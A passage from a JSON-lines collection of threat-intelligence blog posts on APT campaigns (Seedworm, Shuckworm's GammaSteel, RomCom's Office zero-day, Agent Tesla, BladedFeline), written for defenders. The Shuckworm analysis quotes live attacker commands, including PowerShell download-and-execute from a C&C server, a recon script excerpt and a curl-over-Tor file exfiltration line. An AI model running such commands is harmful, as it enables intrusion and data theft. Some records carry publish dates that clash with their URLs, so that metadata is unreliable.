lot of living-off-the-land and publicly available tools, it is also capable of developing its own custom tools, such as the custom build of Venom Proxy and the custom keylogger used in this campaign.\nThe group still makes heavy use of PowerShell and PowerShell-related tools and scripts, underlining the need for organizations to be aware of suspicious use of PowerShell on their networks.\nThe activity observed by Symantec’s Threat Hunter Team took place in November 2023, showing that Seedworm is very much a currently active threat faced by organizations that may be of strategic interest to Iranian threat actors.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\nFile Indicators 1a0827082d4b517b643c86ee678eaa53f85f1b33ad409a23c50164c3909fdaca – MuddyC2Go DLL launcher 25b985ce5d7bf15015553e30927691e7673a68ad071693bf6d0284b069ca6d6a – Benign Java(TM) Platform SE 8 executable used for sideloading MuddyC2Go DLL eac8e7989c676b9a894ef366357f1cf8e285abde083fbdf92b3619f707ce292f – Custom keylogger 3916ba913e4d9a46cfce437b18735bbb5cc119cc97970946a1ac4eab6ab39230 – Venom Proxy Network Indicators 146.70.124[.]102 – SimpleHelp C&C server 94.131.109[.]65 – MuddyC2Go C&C server 95.164.38[.]99 –MuddyC2Go C&C server 45.67.230[.]91 – MuddyC2Go C&C server 45.150.64(.)39 - MuddyC2Go C&C server 95.164.46[.]199 – MuddyC2Go C&C server 94.131.98[.]14 – MuddyC2Go C&C server 94.131.3[.]160 – GoSOCKS5proxy C&C server Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":63,"metadata":{"source":"blog","platform":"symantec","filename":"Seedworm"}}
{"id":144,"title":"Shuckworm Targets Foreign Military Mission Based in Ukraine | Symantec Enterprise Blogs","publish_date":"2025-02-28","link":"https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel","clean_text":"Shuckworm Targets Foreign Military Mission Based in Ukraine Group uses updated PowerShell version of its GammaSteel malware in attack.\nShuckworm’s relentless focus on Ukraine has continued into 2025, with the group targeting the military mission of a Western country based in the Eastern European nation.\nThis first activity in this campaign occurred in February 2025, and it continued into March.\nThe initial infection vector used by the attackers appears to have been an infected removable drive.\nIn this campaign, the attackers appear to be using an updated version of their GammaSteel tool.\nGammaSteel is an infostealer that exfiltrates data from victim networks.\nThe attackers are seen using various methods for data exfiltration, including using the write.as web service for possible exfiltration.\nThey are also seen using cURL alongside Tor as a backup method of data exfiltration.\ncURL is an open-source command-line tool that can be used to transfer data to and from a server and is frequently leveraged by malicious actors.\nThis campaign also seems to demonstrate a move by Shuckworm from using a lot of VBS scripts to using more PowerShell-based tools, particularly later in its attack chain.\nIt is likely leveraging PowerShell for obfuscation and also because it allows it to store scripts in the registry.\nGammaSteel was deployed following a complex, multi-staged attack chain, with frequent use of obfuscation.\nThe process was most likely designed to minimize the risk of detection.\nShuckworm (aka Gamaredon, Armageddon) is a Russia-linked espionage group that has almost exclusively focused its operations on government, law enforcement, and defense organizations in Ukraine since it first appeared in 2013.\nIt is believed that Shuckworm operates on behalf of the Russian Federal Security Service (FSB).\nActivity Timeline The initial infection in this campaign appeared to occur on February 26 with the creation of a Windows Registry value under the UserAssist key that indicates the infection may have started from an external drive and an LNK file named D:\\files.lnk.\nThe UserAssist registry key stores the applications, files, links, and other objects accessed by the user through Windows Explorer stored in a ROT13 format.\nHKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\\Count\\Q:\\svyrf.yax After that event, explorer.exe launched a mshta.exe process executing the following command: \"C:\\Windows\\System32\\mshta.exe\" javascript:eval('w=new%20ActiveXObject(\"WScript.\nShell\");w.run(\"explorer files\");w.run(\"wscript.exe //e:vbScript \\~.drv\");window.close()') Then, the following commands were executed: \"C:\\Windows\\System32\\wscript.exe\" //e:vbScript ~.drv \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\System32\\wscript.exe\" \"\"C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms\"\" //e:vbscript //b /numerousIOC \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\keepoAI.hta\" The ~.drv file is highly obfuscated, but it seems to be used to create two files and execute them: C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms c:\\users\\public\\ntuser.dat.tmcontainer00000000000000000002.regtrans-ms The first file (NTUSER.DAT.TMContainer00000000000000000001.regtrans-ms) is used to contact the command and control (C&C) server and stay in constant contact with it.\nFirst, it searches for a ping record with a WMI query: \"Select * From Win32_PingStatus where Address = 'mil.gov.ua'\" to the address \"mil.gov.ua\", If there is no ping record or the ping is not successful, it will finish execution.\nIt then checks if the C&C server address is stored in the value: HKEY_CURRENT_USER\\\\Console\\\\WindowsUpdates If not, it will run different methods to obtain the final C&C server address.\nThe script leverages different legitimate services to try to resolve the C&C server, including: - hxxps://teletype[.]in/[Value_read_from_WindowsDetect_key] - hxxps://telegra[.]ph/Mark-01-20-5 - hxxps://t[.]me/s/futar23 - [2_digit_number]sleep.crudoes[.]ru - hxxps://check-host[.]net/ip-info?host=[2_digit_number]position.crudoes.ru - position.crudoes[.]ru In this instance, the attackers were able to obtain a C&C server address and contact it: - 107.189.19.218 From hxxps://telegra[.]ph/Mark-01-20-5 we also found the following C&C server: - hxxps://des-cinema-democrat-san.trycloudflare[.]com/server The C&C server is similar to others that have been used by Shuckworm in the past, as shown in an investigation by Recorded Future where the group leveraged Cloudflare tunnels for their C&C infrastructure.\nFrom t[.]me/futar123 we also found the C&C 107.189.19[.]137 from recovered text: - ==107@189@19@137== The second file mentioned previously (NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms) appears to be designed to modify the following registry keys to not show hidden and system files: HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowSuperHidden HKU\\[REDACTED]\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt It then starts to infect any removable drives and network drives by creating shortcut files (.lnk) for every folder to execute the first malicious mshta.exe command (wscript.exe //e:vbScript ~.drv) and hide the folder.\nWe found an array of possible file names in Ukrainian, but it is unknown from the script what these files may do.\nOriginal: (\"План проведення\", \"Спецповідомлення\", \"лиcт дo\", \"СПЕЦПЕРЕВІРКА\", \"Рапорт поранення\", \"вiдряджeння\", \"БОЙОВЕ РОЗПОРЯДЖЕННЯ ППО\", \"Рішення командира на оборону\", \"Зобовязання\", \"бойовий розрахунок\", \"Супровід ГУР\", \"Інформація щодо загиблих\", \"БМП\", \"продовження контракту\", \"Довідка про зустріч з джерелом\") Translated: (\"Conduct plan\", \"Special message\", \"letter to\", \"SPECIAL INSPECTION\", \"Wound report\", \"deployment\", \"AIR DEFENSE COMBAT ORDER\", \"Commander's decision on defense\", \"Obligation\", \"Combat calculation\", \"GUR support\", \"Information on the dead\", \"BMP\", \"contract extension\", \"Reference about meeting with the source\") On March 1, an array of activity occurred on the targeted network.\nOn one machine, the malicious VBscript—C:\\Users\\Public\\NTUSER.DAT.TMContainer00000000000000000002.regtrans-ms—is executed via WScript.exe.\nIt then reaches out to the following C&C URL: - hxxp://172.104.187.254/mood/1/3/2025/confer[.]html?=[REMOVED] The malicious script also exfiltrates some data from the infected machine, such as the username, hostname, and the disk serial number via the User-Agent HTTP request header: IServerXMLHTTPRequest2.setRequestHeader(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 ([USERNAME]::[HOSTNAME]_[DISK_SERIAL_NUMBER]::/.nJudged/.TML,\"); It then saves the valid C&C server address under the registry value: \"HKEY_CURRENT_USER\\Console\\WindowsUpdates\": IWshShell3.RegWrite(\"HKEY_CURRENT_USER\\Console\\WindowsUpdates\", \"http://172.104.187.254/mood/1/3/2025/confer.html?=[REMOVED]\", \"REG_SZ\"); The code received from the server is Base64 encoded and obfuscated and it launches the following PowerShell command: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" sleep 15;$url='http://64.23.190.235/getinfo.php';$discord = (New-Object system.\nNet.\nWebClient).downloadString($url); $discord | iex The C&C server also downloads an obfuscated new version of the same script but this time with hardcoded C&C addresses: - hxxps://surfing-programmer-morris-mortality.trycloudflare[.]com - hxxps://areas-apps-civic-loving.trycloudflare[.]com - hxxps://nav-ni-furnished-handy.trycloudflare[.]com This new malicious VBScript file is stored in the following path: - c:\\users\\[REDACTED]\\ntuser.dat.ini After a connection to the new C&C server (hxxps://nav-ni-furnished-handy.trycloudflare[.]com), two new PowerShell scripts are received.\nThe first script appears to be a reconnaissance tool, which is used to create a screenshot of the machine, run a systeminfo command, get the name of the security software running on the machine, get the available space from all disks, get the VolumeSerialNumber, the directory tree of the Desktop folder, a list of files in the Desktop folder, and a list of the running processes.\nIt then sends all the collected information to the C&C server hxxp://64.23.190[.]235/getinfo[.]php.\nThe following is an excerpt of the PowerShell script: [System.\nReflection.\nAssembly]::LoadWithPartialName(\"System.\nWindows.\nForms\") $ScreenBounds = [System.\nWindows.\nForms.\nSystemInformation]::PrimaryMonitorSize; $arw = \"Wi\",\"dt\",\"h\"; $arh = \"H\",\"ei\",\"g\",\"ht\"; $wi = $arw -join \"\" $he = $arh -join \"\" ; $w = $ScreenBounds.\n\"$wi\" + 1 - 1; $h = $ScreenBounds.\n\"$he\" + 1 - 1; $Image = New-Object System.\nDrawing.\nBitmap($w , $h); $CopyScreen = [System.\nDrawing.\nGraphics]::FromImage($Image); $process = $(ps | foreach-Object{$a = $_.ProcessName; $a+\"`n\"} ); $Point = New-Object System.\nDrawing.\nPoint(1, 1); $ip =\"64.23.190.235\"; $nk = \"com\"; $op = \"o.p\"; $nf = \"nf\"; $nk = $nk + \"putern\" + \"ame\"; $comp = (Get-Item -Path env:\\$nk).Value; $dasda =\"Vo\" $dasda = $dasda +\"lume\" $dasda =$dasda +\"Seria\" $dasda =$dasda +\"lNum\" $dasda =$dasda +\"ber\" $Path = \"$env:appdata\\\"; $name = $path + \"$(get-date -f yyyy.\nMM.dd_h\\h_m\\m)\"+\".jpg\"; if(![System.\nIO.Directory]::Exists($Path)){ New-Item -ItemType Directory $Path } $Point = [Drawing.\nPoint]::Empty $NameValueCollection = New-Object System.\nCollections.\nSpecialized.\nNameValueCollection; $httptext =\"http://\"; $infotext = \"/i\"+$nf+ $op; The second PowerShell script received from the C&C server stores the payload obfuscated and split by functions in different values in the registry.\nSet-ItemProperty -Path 'HKCU:\\Software' -Name 'LGJuKKhrjgwffjmc1jzSkzT' -Value 'DQAKACAAIAAgACAAdAByAHkAewB7AA0ACgAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAFQAZQB4AHQAKAB7ADAAfQAsACAAewAxAH0AKQA7AA0ACgAgACAAIAAgAH0AfQANAAoAIAAgACAAIABjAGEAdABjAGgAewB7AA0ACgANAAoAIAAgACAAIAB9AH0ADQAKAAkA'; Set-ItemProperty -Path 'HKCU:\\Software' -Name 'wOVzQC0zskdwz2xbraoXftD' -Value 'DQAKACAAIAAgACAAdAByAHkAewB7AA0ACgAJAAkAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARgBpAGwAZQBTAHkAcwB0AGUAbQANAAoACQAJAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBaAGkAcABGAGkAbABlAF0AOgA6AEUAeAB0AHIAYQBjAHQAVABvAEQAaQByAGUAYwB0AG8AcgB5ACgAewAwAH0ALAAgAHsAMQB9ACkAOwANAAoACQB9AH0ADQAKAAkAYwBhAHQAYwBoAHsAewANAAoACQB9AH0ADQAKAAkA'; The following is an example of one of the PowerShell functions stored in the registry: try{ $jfecWp1fljll0j004nzEODg = \"www.phlovel.ru\"; $odPSSiffq0huyxichtGXAWo = [System.\nNet.\nDns]::gethostentry($jfecWp1fljll0j004nzEODg).addresslist[0]; $YywyAi53bcklkjtplAEvUrl = $odPSSiffq0huyxichtGXAWo.tostring(); return $YywyAi53bcklkjtplAEvUrl; } catch{ return \"\"; } This stage appears to be the attackers’ final payload—a PowerShell version of Shuckworm’s known GammaSteel tool.\nThis tool enumerates all the files in the following folders: - Desktop - Documents - Downloads It exfiltrates files that match a hardcoded extension list: - \"*.doc\", \"*.docx\", \"*.xls\", \"*.xlsx\", \"*.ppt\", \"*.pptx\", \"*.vsd\", \"*.vsdx\", \"*.rtf\", \"*.odt\", \"*.txt\", \"*.pdf\" It ignores folders that contain the following strings: - \"prog\", \"windows\", \"appdata\", \"local\", \"roaming\", \"software\", \"public\", \"all users\" It uses certutil.exe to get the MD5 of the exfiltrated file and possibly store it as a file, which is something previous versions of the GammaSteel malware also did. \"\nC:\\Windows\\system32\\certutil.exe\" -hashfile \"[REDACTED].txt\" MD5 This version of GammaSteel tries to exfiltrate the files via a PowerShell web request, but if it fails, as a fallback method, it uses cURL with a Tor network proxy to obfuscate the origin IP: \"C:\\Windows\\system32\\curl.exe\" -x socks5://127.0.0.1:9050 -v -k -F o2PVasTpH2AxGgiYBSjb=[REDACTED] -F AWpCbqMhrFvHx4QJkAXlj=@[REDACTED].pdf https://85.92.111.12 The first post parameter contains some information regarding the machine, like the hostname, the drive serial number, and the path of the exfiltrated file: jhEOKsGyR07pNfM::1000::PAikOnBfhsr::[REDACTED].pdf::Bqf4wlnsrc::22.02.2025 14:18:24::mU0p1uNxlLvd::508383::GHCcfPBq1NwgZ::boML6spmjPF::Ti5vCm4hcu::[REDACTED]**2863E630::S3apqcC4J20QH It also contained some incomplete code that seems to leverage the web service write.as to possibly exfiltrate some information from the computer: $REGWeqlhlmtvuskihNeRgib = \"https://write.as/api/posts\"; $XUqKFBjm5dwgqh5aljmHuTC = '{{\"body\": \"This is a post.\", \"\ntitle\": \"My First Post\"}}'; $aFKGHf31o2g4jrm00nkAQdv = @{{\"Content-Type\" = \"application/json\"}}; $KMTPQV1jeau2lslqmzcNPyG = Invoke-WebRequest -Uri $REGWeqlhlmtvuskihNeRgib -Method \"POST\" -Body $XUqKFBjm5dwgqh5aljmHuTC -Headers $aFKGHf31o2g4jrm00nkAQdv; To obtain persistence, the malware registers itself in the Run registry key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[USERNAME] Conclusion This attack does mark something of an increase in sophistication for Shuckworm, which appears to be less skilled than other Russian actors, though it compensates for this with its relentless focus on targets in Ukraine.\nWhile the group does not appear to have access to the same skill set as some other Russian groups, Shuckworm does now appear to be trying to compensate for this by continually making minor modifications to the code it uses, adding obfuscation, and leveraging legitimate web services, all to try lower the risk of detection.\nThis campaign also demonstrates that the group remains laser-focused on targeting entities within Ukraine for espionage purposes.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\n714aeb3d778bbd03d0c9eaa827ae8c91199ef07d916405b7f4acd470f9a2a437 90ec1f4dd69c84c3eb0b2cada4a31168de278eff9b21cb20551ec39d5bcb9da2 Lucystew[.]ru position.crudoes[.]ru www.phlovel[.]ru areas-apps-civic-loving.trycloudflare[.]com des-cinema-democrat-san.trycloudflare[.]com distributors-marble-saddam-much.trycloudflare[.]com nav-ni-furnished-handy.trycloudflare[.]com surfing-programmer-morris-mortality.trycloudflare[.]com affects-periodic-explorer-broadband.trycloudflare[.]com abraham-lc-happened-ericsson.trycloudflare[.]com argentina-references-rapid-selecting.trycloudflare[.]com beverly-cups-soft-concentrate.trycloudflare[.]com boxes-harvest-cameroon-uniform.trycloudflare[.]com cables-tension-bronze-hans.trycloudflare[.]com convergence-suffering-reel-ingredients.trycloudflare[.]com detector-excluded-knowledgestorm-two.trycloudflare[.]com fee-ss-launch-remedies.trycloudflare[.]com ff-susan-config-mod.trycloudflare[.]com nail-employed-icon-pre.trycloudflare[.]com pdt-throwing-pod-places.trycloudflare[.]com presents-turner-cir-hollow.trycloudflare[.]com promptly-allows-pendant-close.trycloudflare[.]com reflection-tomorrow-brook-dakota.trycloudflare[.]com representatives-liable-sight-tigers.trycloudflare[.]com sick-netherlands-alumni-electric.trycloudflare[.]com terry-training-springer-engagement.trycloudflare[.]com farming-alternatively-velvet-warming.trycloudflare[.]com pays-habitat-florists-virtually.trycloudflare[.]com jet-therapy-cape-correctly.trycloudflare[.]com der-grande-transmitted-benchmark.trycloudflare[.]com eddie-lewis-exercises-conventions.trycloudflare[.]com jon-shopzilla-canada-analytical.trycloudflare[.]com hints-heated-terrain-poem.trycloudflare[.]com belongs-tells-sum-harvest.trycloudflare[.]com obj-sudan-quote-aw.trycloudflare[.]com acquisition-gray-advertisements-trained.trycloudflare[.]com missouri-itunes-recognize-adds.trycloudflare[.]com over-function-foo-school.trycloudflare[.]com criterion-receipt-proceeds-fate.trycloudflare[.]com phpbb-zealand-hop-magnetic.trycloudflare[.]com score-adams-coastal-moreover.trycloudflare[.]com 107.189.19[.]137 107.189.19[.]218 165.232.153[.]27 172.104.187[.]254 64.23.190[.]235 85.92.111[.]12 45.61.166[.]43 159.223.50[.]199 139.59.136[.]192 104.16.230[.]132 104.16.231[.]132 ntuser.dat.tmcontainer00000000000000000001.regtrans-ms ntuser.dat.tmcontainer00000000000000000002.regtrans-ms ~.drv ntuser.dat.ini desperately.tmp Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":65,"metadata":{"source":"blog","platform":"symantec","filename":"Shuckworm"}}
{"id":145,"title":"Attackers Exploit Unpatched Windows Zero-Day Vulnerability | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/microsoft-zeroday-exploit","clean_text":"Attackers Exploit Unpatched Windows Zero-Day Vulnerability Exploit of CVE-2023-36884 was used in targeted attacks against organizations in Europe and North America.\nA zero-day vulnerability (CVE-2023-36884) affecting Microsoft Windows and Office products is being exploited by attackers in the wild.\nTo date, the exploit has been used in highly targeted attacks against organizations in the government and defense sectors in Europe and North America.\nThe vulnerability was disclosed yesterday (July 11) by Microsoft, which said that an attacker could create a specially crafted Microsoft Office document that enables remote code execution on the target’s computer.\nIn order for the exploit to succeed, the victim needs to open the malicious file.\nNo patch has been released yet for the vulnerability.\nHowever, Microsoft is still investigating the issue and said a patch may be rolled out in its monthly release process or in an out-of-cycle security update.\nThe company provided some mitigation guidance in its advisory.\nHow is the vulnerability being exploited?\nAccording to a separate blog published by Microsoft, the vulnerability was being exploited by an actor it calls Storm-0978 (aka RomCom) in targeted attacks against defense and government organizations in Europe and North America.\nThe exploit was contained in Microsoft Word documents that masqueraded as information about the Ukrainian World Congress.\nThe attacks were earlier documented by BlackBerry on July 8, which noted that the targets were guests for the upcoming NATO Summit.\nAt the time, the use of the zero-day in the attacks was unknown.\nWho is Storm-0978/RomCom?\nStorm-0978/RomCom is a Russia-linked threat actor that has been involved in both espionage and cyber-crime activity.\nThe group acquired its name through its use of the RomCom remote access Trojan (RAT).\nThere are strong ties between it and a group Symantec calls Hawker, which is the developer of the Cuba ransomware family.\nThe U.S Cybersecurity and Infrastructure Security Agency (CISA) has said that there are possibly links between Hawker, RomCom, and the Industrial Spy ransomware actors.\nA report published last year by Palo Alto also detailed how RomCom (whom it calls Tropical Scorpius) used the RomCom RAT to deliver the Cuba ransomware payload to victims.\nWhile it is clear that there are strong ties between Storm-0978/RomCom and Hawker, it is unclear yet whether the two actors are one and the same.\nHow severe is this vulnerability?\nUntil a patch is released, organizations should adopt all possible mitigation strategies.\nAlthough the vulnerability has, to date, been exploited in targeted attacks, news of its existence will doubtlessly lead other attackers to attempt to replicate the exploit.\nProtection/Mitigation Email-based - Coverage is in place for Symantec’s email security products File-based - Trojan.\nMdropper - WS.Malware.1 Network-based - Web Attack: Webpulse Bad Reputation Domain Request Web-based - Observed domains/IPs are covered under security categories in all WebPulse enabled products Symantec is continuing to investigate further possible protection based on available information, and additional signatures may be introduced as analysis progresses.\nFor the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\na61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f e7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539 d3263cc3eff826431c2016aee674c7e3e5329bebfb7a145907de39a279859f4a 3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97 Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":29,"metadata":{"source":"blog","platform":"symantec","filename":"Windows-Zero-Day"}}
{"id":146,"title":"Hackers Exploiting MS Excel Vulnerability to Spread Agent Tesla Malware","publish_date":"2023-09-28","link":"https://thehackernews.com/2023/12/hackers-exploiting-old-ms-excel.html","clean_text":"Attackers are weaponizing an old Microsoft Office vulnerability as part of phishing campaigns to distribute a strain of malware called Agent Tesla.\nThe infection chains leverage decoy Excel documents attached in invoice-themed messages to trick potential targets into opening them and activate the exploitation of CVE-2017-11882 (CVSS score: 7.8), a memory corruption vulnerability in Office's Equation Editor that could result in code execution with the privileges of the user.\nThe findings, which come from Zscaler ThreatLabz, build on prior reports from Fortinet FortiGuard Labs, which detailed a similar phishing campaign that exploited the security flaw to deliver the malware. \"\nOnce a user downloads a malicious attachment and opens it, if their version of Microsoft Excel is vulnerable, the Excel file initiates communication with a malicious destination and proceeds to download additional files without requiring any further user interaction,\" security researcher Kaivalya Khursale said.\nThe first payload is an obfuscated Visual Basic Script, which initiates the download of a malicious JPG file that comes embedded with a Base64-encoded DLL file.\nThis steganographic evasion tactic was previously also detailed by McAfee Labs in September 2023.\nThe concealed DLL is subsequently injected into RegAsm.exe, the Windows Assembly Registration Tool, to launch the final payload.\nIt's worth noting that the executable has also been abused to load Quasar RAT in the past.\nAgent Tesla is a .NET-based advanced keylogger and remote access trojan (RAT) that's equipped to harvest sensitive information from compromised hosts.\nThe malware then communicates with a remote server to extract the collected data. \"\nThreat actors constantly adapt infection methods, making it imperative for organizations to stay updated on evolving cyber threats to safeguard their digital landscape,\" Khursale said.\nThe development comes as old security flaws become new attack targets for threat actors.\nEarlier this week, Imperva revealed that a three-year-old flaw in Oracle WebLogic Server (CVE-2020-14883, CVSS score: 7.2) is being utilized by the 8220 Gang to deliver cryptocurrency miners.\nIt also coincides with an uptick in DarkGate malware activity after it began to be advertised earlier this year as a malware-as-a-service (MaaS) offering and as a replacement for QakBot following its takedown back in August 2023. \"\nThe technology sector is the most impacted by DarkGate attack campaigns,\" Zscaler said, citing customer telemetry data. \"\nMost DarkGate domains are 50 to 60 days old, which may indicate a deliberate approach where threat actors create and rotate domains at specific intervals.\"\nPhishing campaigns have also been discovered targeting the hospitality sector with booking-related email messages to distribute information stealer malware such as RedLine Stealer or Vidar Stealer, according to Sophos. \"\nThey initially contact the target over email that contains nothing but text, but with subject matter a service-oriented business (like a hotel) would want to respond to quickly,\" researchers Andrew Brandt and Sean Gallagher said. \"\nOnly after the target responds to the threat actor's initial email does the threat actor send a followup message linking to what they claim is details about their request or complaint.\"\nStealers and trojans notwithstanding, phishing attacks have further taken the form of bogus Instagram \"Copyright Infringement\" emails to steal users' two-factor authentication (2FA) backup codes via fraudulent web pages with an aim to bypass account protections, a scheme called Insta-Phish-A-Gram. \"\nThe data attackers retrieve from this kind of phishing attack can be sold underground or used to take over the account,\" cybersecurity firm Trustwave said.","num_sentences":21,"metadata":{"source":"blog","platform":"thehackernews","filename":"Agent-Tesla"}}
{"id":147,"title":"Iran-Linked BladedFeline Hits Iraqi and Kurdish Targets with Whisper and Spearal Malware","publish_date":"2017-09-28","link":"https://thehackernews.com/2025/06/iran-linked-bladedfeline-hits-iraqi-and.html","clean_text":"An Iran-aligned hacking group has been attributed to a new set of cyber attacks targeting Kurdish and Iraqi government officials in early 2024.\nThe activity is tied to a threat group ESET tracks as BladedFeline, which is assessed with medium confidence to be a sub-cluster within OilRig, a known Iranian nation-state cyber actor.\nIt's said to be active since September 2017, when it targeted officials associated with the Kurdistan Regional Government (KRG). \"\nThis group develops malware for maintaining and expanding access within organizations in Iraq and the KRG,\" the Slovak cybersecurity company said in a technical report shared with The Hacker News. \"\nBladedFeline has worked consistently to maintain illicit access to Kurdish diplomatic officials, while simultaneously exploiting a regional telecommunications provider in Uzbekistan, and developing and maintaining access to officials in the government of Iraq.\"\nBladedFeline was first documented by ESET in May 2024 as part of its APT Activity Report Q4 2023–Q1 2024, detailing the adversary's attack on a governmental organization from the Kurdistan region of Iraq and its targeting of the Uzbekistan telecom provider that may have been compromised as early as May 2022.\nThe group was discovered in 2023 following attacks aimed at Kurdish diplomatic officials with Shahmaran, a simple backdoor that checks in with a remote server and executes any operator-provided commands on the infected host to upload or download files, request specific file attributes, and provide a file and directory manipulation API.\nThen last November, the cybersecurity firm said it observed the hacking crew orchestrating attacks against Iran's neighbors, particularly regional and government entities in Iraq and diplomatic envoys from Iraq to various countries, using bespoke backdoors like Whisper (aka Veaty), Spearal, and Optimizer. \"\nBladedFeline has invested heavily in gathering diplomatic and financial information from Iraqi organizations, indicating that Iraq plays a large part in the strategic objectives of the Iranian government,\" ESET noted in November 2024. \"\nAdditionally, governmental organizations in Azerbaijan have been another focus of BladedFeline.\"\nWhile the exact initial access vector used to get into KRG victims is unclear, it's suspected that the threat actors likely leveraged a vulnerability in an internet-facing application to break into Iraqi government networks and deploy the Flog web shell to maintain persistent remote access.\n| The inner workings of the Whisper backdoor | The wide range of backdoors highlights BladedFeline's commitment to refining its malware arsenal.\nWhisper is a C#/.NET backdoor that logs into a compromised webmail account on a Microsoft Exchange server and uses it to communicate with the attackers via email attachments.\nSpearal is a .NET backdoor that utilizes DNS tunneling for command-and-control communication. \"\nOptimizer is an iterative update on the Spearal backdoor.\nIt uses the same workflow and offers the same features.\nThe main differences between Spearal and Optimizer are largely cosmetic,\" the ESET research team told The Hacker News.\nSelect attacks observed in December 2023 have also involved the deployment of a Python implant referred to as Slippery Snakelet that comes with limited capabilities to execute commands via \"cmd.exe,\" download files from an external URL, and upload files.\nThe backdoors notwithstanding, BladedFeline is notable for the use of various tunneling tools Laret and Pinar to maintain access to target networks.\nAlso put to use is a malicious IIS module dubbed PrimeCache, which ESET said bears similarities to the RDAT backdoor used by OilRig APT.\nA passive backdoor, PrimeCache works by keeping an eye out for incoming HTTP requests matching a predefined cookie header structure in order to process commands issued by the attacker and exfiltrate files.\nIt's this aspect, coupled with the fact that two of OilRig's tools – RDAT and a reverse shell codenamed VideoSRV – were discovered on a compromised KRG system in September 2017 and January 2018, respectively, has led to the possibility that BladedFeline may be a subgroup within OilRig, but also different from Lyceum – a moniker assigned to a different sub-cluster.\nThe OilRig connection is also reinforced by a September 2024 report from Check Point, which pointed fingers at the Iranian hacking group for infiltrating the networks of Iraqi government networks and infecting them with Whisper and Spearal using likely social engineering efforts.\nESET said it identified a malicious artifact named Hawking Listener that was uploaded to the VirusTotal platform in March 2024 by the same party that uploaded Flog.\nHawking Listener is an early-stage implant that listens on a specified port to run commands through \"cmd.exe.\" \"\nBladedFeline is targeting the KRG and the GOI for cyber espionage purposes, with an eye toward maintaining strategic access to high-ranking officials in both governmental entities,\" the company concluded. \"\nThe KRG's diplomatic relationship with Western nations, coupled with the oil reserves in the Kurdistan region, makes it an enticing target for Iran-aligned threat actors to spy on and potentially manipulate.\nIn Iraq, these threat actors are most probably trying to counter the influence of Western governments following the U.S. invasion and occupation of the country.\"","num_sentences":28,"metadata":{"source":"blog","platform":"thehackernews","filename":"BladedFeline"}}
{"id":148,"title":"North Korean Hackers Spread Malware via Fake Crypto Firms and Job Interview Lures","publish_date":"2024-09-28","link":"https://thehackernews.com/2025/04/north-korean-hackers-spread-malware-via.html","clean_text":"North Korea-linked threat actors behind the Contagious Interview have set up front companies as a way to distribute malware during the fake hiring process. \"\nIn this new campaign, the threat actor group is using three front companies in the cryptocurrency consulting industry – BlockNovas LLC (blocknovas[.]\ncom), Angeloper Agency (angeloper[.]com), and SoftGlide LLC (softglide[.]co) – to spread malware via 'job interview lures,\" Silent Push said in a deep-dive analysis.\nThe activity, the cybersecurity company said, is being used to distribute three different known malware families, BeaverTail, InvisibleFerret, and OtterCookie.\nContagious Interview is one of the several job-themed social engineering campaigns orchestrated by North Korea to entice targets into downloading cross-platform malware under the pretext of coding assignment or fixing an issue with their browser when turning on camera during a video assessment.\nThe activity is tracked by the broader cybersecurity community under the monikers CL-STA-0240, DeceptiveDevelopment, DEV#POPPER, Famous Chollima, UNC5342, and Void Dokkaebi.\nThe use of front companies for malware propagation, complemented by setting up fraudulent accounts on Facebook, LinkedIn, Pinterest, X, Medium, GitHub, and GitLab, marks a new escalation for the threat actors, who have been observed using various job boards to lure victims. \"\nThe BlockNovas front company has 14 people allegedly working for them, however many of the employee personas [...] appear to be fake,\" Silent Push said. \"\nWhen viewing the 'About Us' page of blocknovas[.]com via the Wayback Machine, the group claimed to have been operating for '12+ years' – which is 11 years longer than the business has been registered.\"\nThe attacks lead to the deployment of a JavaScript stealer and loader called BeaverTail, which is then used to drop a Python backdoor referred to as InvisibleFerret that can establish persistence on Windows, Linux, and macOS hosts.\nSelect infection chains have also been found to serve another malware codenamed OtterCookie via the same JavaScript 